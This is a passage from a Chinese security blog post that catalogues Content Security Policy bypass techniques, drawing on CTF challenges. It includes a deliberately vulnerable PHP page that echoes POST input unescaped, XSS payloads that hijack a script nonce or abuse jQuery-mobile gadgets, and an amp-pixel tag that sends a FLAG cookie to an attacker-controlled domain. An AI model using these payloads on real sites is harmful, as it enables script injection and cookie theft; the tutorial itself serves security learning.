&lt;button type=&quot;submit&quot;&gt;Go&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	if (isset($_POST[&apos;content&apos;])) &#123;</span><br><span class="line">		echo &quot;Your POST content: &lt;p&gt;&quot;.@$_POST[&apos;content&apos;].&quot;&lt;/p&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; nonce=&lt;?php echo $nonce;?&gt;&gt;document.write(&quot;Mi1k7ea&quot;)&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>当我们输入<code>&lt;script src=&quot;http://192.168.43.201/a.js&quot; a=&quot;</code>时即会弹框：</p>
<p><img src="CSP策略及绕过技巧小结/1.png" alt=""></p>
<p>查看元素，看到输入的script标签的a属性的双引号将后面含有nonce的script标签第一个含有双引号的属性都给闭合了，成功劫持了nonce属性进而加载外部JS弹框：</p>
<p><img src="CSP策略及绕过技巧小结/2.png" alt=""></p>
<p>值得注意的就是，要想成功利用在nonce属性前需要存在一个用引号括起来的属性，不然会失效。</p>
<p>另外，在之前做过的一道CSP题目中，也有应用到这种方法，可以参考学习一下：<a href="https://www.mi1k7ea.com/2019/02/21/%E4%B8%80%E9%81%93%E7%BB%95%E8%BF%87CSP%E7%9A%84XSS%E9%A2%98%E7%9B%AE/">一道绕过CSP的XSS题目</a></p>
<h3 id="6、利用Gadgets和strict-dynamic-unsafe-eval绕过"><a href="#6、利用Gadgets和strict-dynamic-unsafe-eval绕过" class="headerlink" title="6、利用Gadgets和strict-dynamic/unsafe-eval绕过"></a>6、利用Gadgets和strict-dynamic/unsafe-eval绕过</h3><p>即重用Gadgets代码来绕过CSP，具体可参考Black Hat 2017的<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf">ppt</a>，上面总结了可以被用来绕过CSP的一些JS库。</p>
<p>例如假设页面中使用了Jquery-mobile库，并且CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，那么下面的向量就可以绕过CSP：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">popup</span> <span class="attr">id</span>=<span class="string">'&lt;script&gt;alert(1)&lt;/script&gt;'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在这个PPT之外的还有一些库也可以被利用，例如RCTF2018中遇到的amp库，下面的标签可以获取名字为FLAG的cookie：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">amp-pixel</span> <span class="attr">src</span>=<span class="string">"http://your domain/?cid=CLIENT_ID(FLAG)"</span>&gt;</span><span class="tag">&lt;/<span class="name">amp-pixel</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在做过的一道CSP题目中，也有应用到这种方法，可以参考学习一下：<a href="https://www.mi1k7ea.com/2019/02/21/%E4%B8%80%E9%81%93%E7%BB%95%E8%BF%87CSP%E7%9A%84XSS%E9%A2%98%E7%9B%AE/">一道绕过CSP的XSS题目</a></p>
<h3 id="7、利用iframe绕过"><a href="#7、利用iframe绕过" class="headerlink" title="7、利用iframe绕过"></a>7、利用iframe绕过</h3><p>（1）如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"B"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>（2）在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”<a href="http://xxx">http://xxx</a>“页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">csp</span>=<span class="string">"script-src 'unsafe-inline'"</span> <span class="attr">src</span>=<span class="string">"http://xxx"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>（3）绕过sandbox：</p>
<p>……</p>
<h3 id="8、利用meta绕过CSP-nonce"><a href="#8、利用meta绕过CSP-nonce" class="headerlink" title="8、利用meta绕过CSP nonce"></a>8、利用meta绕过CSP nonce</h3><p>meta标签有一些不常用的功能有时候有奇效：</p>
<p>meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"cache-control"</span> <span class="attr">content</span>=<span class="string">"public"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>meta可以设置Cookie（Firefox下），可以结合self-xss利用：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Set-Cookie"</span> <span class="attr">Content</span>=<span class="string">"cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21</span></span></span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/f1de775bc43e">CSP策略及绕过方法</a></p>
<p><a href="https://www.cnblogs.com/afanti/p/9298415.html">通过iframe标签绕过csp</a></p>
<p><a href="http://www.bubuko.com/infodetail-2152128.html">CSP学习和绕过</a></p>
</script></li></ul>
  </div>
</article>


<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
<br><br>
<div id="vcomments"></div>
    <script>
        new Valine({
            av: AV,
            el: '#vcomments',
            appId: 'Jyl0XQwm2jIH31Tx16dygCNv-gzGzoHsz',
            appKey: 'Iqq1VTg9X5EfKJt3MMIj8MMB',
            placeholder: '大佬亲临寒站，可否指点一二',
        })
    </script>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">門面</a></li>
         
          <li><a href="/archives/">歸檔</a></li>
         
          <li><a href="/categories/">目錄</a></li>
         
          <li><a href="/tags/">標籤</a></li>
         
          <li><a href="/about/">吾</a></li>
         
          <li><a href="https://blog.csdn.net/ski_12/">舊文</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#何为CSP"><span class="toc-number">1.</span> <span class="toc-text">何为CSP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP语法"><span class="toc-number">2.</span> <span class="toc-text">CSP语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#策略指令"><span class="toc-number">2.1.</span> <span class="toc-text">策略指令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#default-src"><span class="toc-number">2.1.1.</span> <span class="toc-text">default-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#script-src"><span class="toc-number">2.1.2.</span> <span class="toc-text">script-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#style-src"><span class="toc-number">2.1.3.</span> <span class="toc-text">style-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#img-src"><span class="toc-number">2.1.4.</span> <span class="toc-text">img-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-src"><span class="toc-number">2.1.5.</span> <span class="toc-text">font-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#connect-src"><span class="toc-number">2.1.6.</span> <span class="toc-text">connect-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#child-src"><span class="toc-number">2.1.7.</span> <span class="toc-text">child-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#manifest-src"><span class="toc-number">2.1.8.</span> <span class="toc-text">manifest-src</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内容源"><span class="toc-number">2.2.</span> <span class="toc-text">内容源</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#源列表"><span class="toc-number">2.2.1.</span> <span class="toc-text">源列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#关键字"><span class="toc-number">2.2.2.</span> <span class="toc-text">关键字</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/&text=CSP策略及绕过技巧小结"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/&title=CSP策略及绕过技巧小结"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/&is_video=false&description=CSP策略及绕过技巧小结"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CSP策略及绕过技巧小结&body=Check out this article: https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/&title=CSP策略及绕过技巧小结"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/&title=CSP策略及绕过技巧小结"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/&title=CSP策略及绕过技巧小结"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/&title=CSP策略及绕过技巧小结"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/&name=CSP策略及绕过技巧小结&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="false"></i> 菜單</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="false"></i> 目錄</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="false"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="false"></i> 返回頂部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2019 Mi1k7ea
  </div>
  <span id="busuanzi_container_site_pv"> 
    <i class="fas fa-eye"></i>
    过客：<span id="busuanzi_value_site_uv"></span>
  </span>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">門面</a></li>
         
          <li><a href="/archives/">歸檔</a></li>
         
          <li><a href="/categories/">目錄</a></li>
         
          <li><a href="/tags/">標籤</a></li>
         
          <li><a href="/about/">吾</a></li>
         
          <li><a href="https://blog.csdn.net/ski_12/">舊文</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </nav>
  </div>
</footer>
<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    </div>
    <!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

    <!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
